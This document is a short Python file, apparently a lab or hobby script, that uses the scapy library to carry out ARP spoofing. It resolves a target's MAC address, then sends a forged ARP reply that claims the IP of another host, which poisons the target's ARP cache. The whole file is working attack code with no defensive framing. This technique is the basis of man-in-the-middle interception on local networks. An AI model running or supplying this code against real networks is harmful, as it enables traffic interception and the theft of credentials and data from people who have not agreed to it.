import sys
from scapy.all import *

class ArpSpoofing:

    def __init__(self):
        pass

    def doSpoof(self, hostToAttack, hostToSpoof):

        def obtainMac(hostToAttack):
            arpReq = ARP(pdst=hostToAttack)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arpReqBroad = broadcast/arpReq
            result = srp(arpReqBroad, timeout=1,verbose=False)[0]

            return result[0][1].hwsrc

        print("spoof")

        targetMac = obtainMac(hostToAttack)
        #op = 2 means that it is a reply
        packet = ARP(op=2, pdst=hostToAttack, hwdst=targetMac, psrc=hostToSpoof)
        send(packet, verbose=False)
        print("Spoof Spoof")








